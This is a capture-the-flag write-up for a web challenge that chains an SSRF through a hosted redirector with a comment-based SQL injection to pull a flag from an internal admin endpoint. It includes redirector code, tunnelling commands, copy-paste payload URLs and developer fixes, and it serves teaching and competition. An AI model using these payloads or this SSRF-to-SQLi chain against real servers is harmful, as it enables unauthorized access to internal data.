# Dark Side of Asteroid — Detailed CTF Writeup

**Challenge:** Dark Side of Asteroid (100 pts)

**Target:** `http://ctf.compfest.id:7302/`


**Date:** 2025-10-05

---

## Summary
This challenge chains an SSRF (Server-Side Request Forgery) with a restrictive SQL query endpoint to exfiltrate secrets stored in an internal database. The server accepts a user-supplied `photo_url`, performs an HTTP GET on that URL and follows redirects. An internal admin-only endpoint (`/internal/admin/search`) responds only to requests from `127.0.0.1`. By hosting a redirector and forcing the application to follow a redirect to the internal endpoint, we can cause the server to query its own admin route and return secret content. The server displays non-image responses returned by the `photo_url` fetch in the user's Profile page, so returned plaintext appears in the UI.

We successfully extracted the flag:

```
COMPFEST17{you_lov3_ez_s5rf_and_s1mpl3_inject_r1gh7???}
```

---

## Vulnerabilities present

1. **SSRF via `profile.photo_url`**
   - The `profile` route accepts any URL, checks *only the hostname* whether it's a private IP, and then performs `requests.get(photo_url, timeout=5)`.
   - The code checks `is_private_url()` only on the original hostname (before redirects). Because `requests` follows redirects, a public hostname that redirects to `127.0.0.1` allows SSRF to internal services.

2. **Internal admin endpoint with weak access constraints**
   - `/internal/admin/search` only allows access from `127.0.0.1` (good), but it runs SQL queries and returns plaintext secrets if queried.
   - When `q` is empty, it returns secrets where `access_level <= 2`. The actual Flag is stored at `access_level = 3`.

3. **SQL logic that can be abused when combined with SSRF**
   - The non-empty `q` path runs a `filter_sqli(q)` that uses a blacklist and then constructs a query of the form:

     ```sql
     SELECT secret_name, secret_value FROM admin_secrets WHERE secret_name LIKE '{search}' AND access_level <= 2
     ```

   - `filter_sqli` bans many tokens (including spaces and common SQL keywords), but *requires* the substring `access_level` to be present somewhere in the payload. This constraint can be turned to our advantage by including `access_level` inside a SQL comment and using comment markers to neutralize the trailing `AND access_level <= 2`.

---

## Information gathering
- Register or log in (any account works).
- Navigate to **Profile**. The Profile page allows a user to submit a `photo_url` and will fetch that URL. If the returned content is not an image, the Profile displays the response body under a "Failed to render as image" section. This is the exfil channel.

- Confirm SSRF by causing the app to fetch an attacker-controlled URL that redirects to `http://127.0.0.1:5000/internal/admin/search`.

---

## Exploitation steps (practical)

### 1) Host a simple redirector
You need a redirector that will reply with a `302` to the internal admin route. A minimal Flask redirector used in this writeup:

```python
# redirect_server.py
from flask import Flask, redirect, request
app = Flask(__name__)

@app.route('/r')
def r():
    to = request.args.get('to', '')
    if not to:
        return "Usage: /r?to=<url>"
    return redirect(to, code=302)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

Run it locally:

```bash
python3 redirect_server.py
```

Expose it publicly if the CTF server cannot reach your machine. Options include `ngrok`, `cloudflared`, `serveo` (used earlier), `localtunnel`, etc. For this solve we used **cloudflared** and **serveo** during different attempts.

---

### 2) Using Cloudflared (detailed)
Cloudflared is reliable and often less blocked by CTF judges. Steps to expose your local redirector (port **8000**):

1. Install Cloudflared (one-liners):

```bash
# Debian/Ubuntu example (binary download)
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
chmod +x cloudflared-linux-amd64
sudo mv cloudflared-linux-amd64 /usr/local/bin/cloudflared
```

2. Run your redirector (port 8000):

```bash
python3 redirect_server.py
```

3. Start the tunnel (this prints your public domain):

```bash
cloudflared tunnel --url http://localhost:8000
```

Example output will show a domain such as:

```
INFO: Your tunnel has started! Visit:
https://sly-hawk-52d7.trycloudflare.com
```

4. Use that domain in the Photo URL payloads below (replace `<CF_DOMAIN>` with the domain printed by cloudflared).

---

### 3) Trigger SSRF and confirm
Use the redirector endpoint as the `Photo URL` in the Profile page. Example flow using a public endpoint (replace `<CF_DOMAIN>` with your cloudflared domain):

```
https://<CF_DOMAIN>/r?to=http%3A%2F%2F127.0.0.1%3A5000%2Finternal%2Fadmin%2Fsearch
```

After submission, check the Profile page. You should see returned plaintext such as the lower-level admin secrets:

```
author_message: You sure you can get the flag? Think twice…
welcome_note: Welcome to the Asteroid Admin system!
```

This confirms SSRF and that the app successfully fetched the internal endpoint.

---

### 4) Bypass SQL restriction to retrieve the Flag
The internal endpoint when given `q` does `filter_sqli(q)` which:

- **Bans**: `union, select, from, where, insert, delete, update, drop, or,  (space), table, database, schema, group, order, by, ;, =, <, >, ||, 	`
- **Requires**: that `access_level` substring exists in the input.

The constructed SQL when `q` is provided is:

```sql
SELECT secret_name, secret_value FROM admin_secrets WHERE secret_name LIKE '{search}' AND access_level <= 2
```

The plan is to make `{search}` evaluate to `'%'` (match all rows) and simultaneously comment out the trailing `AND access_level <= 2` so the `access_level` filter is removed. The filter requirement (`access_level` present) is satisfied by placing `access_level` inside a SQL comment token `/*access_level*/` within `q`.

**Final idea:** craft `q` so that the SQL effectively becomes:

```sql
SELECT secret_name, secret_value FROM admin_secrets WHERE secret_name LIKE '%' /*access_level*/ -- AND access_level <= 2
```

Which returns all rows, including the Flag row.

---

### 5) Working payloads (copy/paste-ready)
Replace `<CF_DOMAIN>` with your cloudflared domain.

**A — SSRF smoke test** (should return low-level secrets):

```
https://<CF_DOMAIN>/r?to=http%3A%2F%2F127.0.0.1%3A5000%2Finternal%2Fadmin%2Fsearch
```

**B — Exploit payload that returned the flag in the writeup:**

```
https://<CF_DOMAIN>/r?to=http%3A%2F%2F127.0.0.1%3A5000%2Finternal%2Fadmin%2Fsearch%3Fq%3D%2525%2527%252F%252Aaccess_level%252A%252F--
```

> Note: the `q` part is percent-encoded to survive redirect and parsing; these one-line URLs are ready to paste into the Profile form after substituting `<CF_DOMAIN>`.

---

### 6) Extracted flag
The flag printed in the profile response was:

```
COMPFEST17{you_lov3_ez_s5rf_and_s1mpl3_inject_r1gh7???}
```

---

## Debugging tips & logs
- Make cloudflared verbose for troubleshooting:

```bash
cloudflared tunnel --url http://localhost:8000 --loglevel debug
```

- Add simple request logging to the redirector to see incoming `to` values:

```python
print("Incoming to=", to, "from", request.remote_addr)
```

- If you get `No secrets found` after injection, try slightly different quoting/comment placements; SQL errors are informative — copy them exactly and use them to tune payloads.

---

## Fixes for developers
1. **Do not allow the server to fetch arbitrary URLs.** If fetching is required, use an allowlist of domains and prevent redirects to other hosts.
2. **Block redirect following to private/internal IP ranges** by checking the final resolved IP after redirects.
3. **Use parameterized queries** and never concatenate user input into SQL strings.
4. **Avoid blacklist-based SQL sanitization**; these are brittle and bypassable.

---

## Appendix — quick command references
- Run redirector locally:

```bash
python3 redirect_server.py
```

- Expose via Cloudflared:

```bash
cloudflared tunnel --url http://localhost:8000
# note the https://<CF_DOMAIN> printed
```

- Sample successful Photo URL used (example):

```
https://volunteers-units-weblogs-officers.trycloudflare.com/r?to=http%3A%2F%2F127.0.0.1%3A5000%2Finternal%2Fadmin%2Fsearch%3Fq%3D%2525%2527%252F%252Aaccess_level%252A%252F--
```

---

If you want additional variants (raw HTTP traces, more injection attempts, or a short slide-style summary), tell me and I will append them.

